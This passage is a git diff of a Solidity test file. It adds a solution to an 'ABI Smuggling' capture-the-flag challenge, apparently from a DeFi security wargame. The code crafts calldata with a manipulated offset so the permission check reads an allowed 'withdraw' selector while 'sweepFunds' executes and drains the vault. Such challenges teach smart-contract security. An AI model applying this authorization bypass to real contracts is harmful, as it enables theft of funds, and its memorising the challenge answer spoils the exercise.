@@ -73,7 +73,20 @@ contract ABISmugglingChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_abiSmuggling() public checkSolvedByPlayer {
-        
+        bytes memory callData = abi.encodePacked(
+            AuthorizedExecutor.execute.selector,     // 4 bytes execute selector
+            uint256(uint160(address(vault))),        // 32 bytes target
+            uint256(100),                            // 32 bytes actionData offset
+            uint256(0),                              // 32 bytes empty
+            SelfAuthorizedVault.withdraw.selector,   // 4 bytes withdraw selector
+            uint256(68),                             // 32 bytes actionData length
+            SelfAuthorizedVault.sweepFunds.selector, // 4 bytes sweepFunds selector
+            uint256(uint160(address(recovery))),     // 32 bytes receiver
+            uint256(uint160(address(token)))         // 32 bytes token
+        );
+
+        (bool success,) = address(vault).call(callData);
+        assert(success);
     }
 
     /**
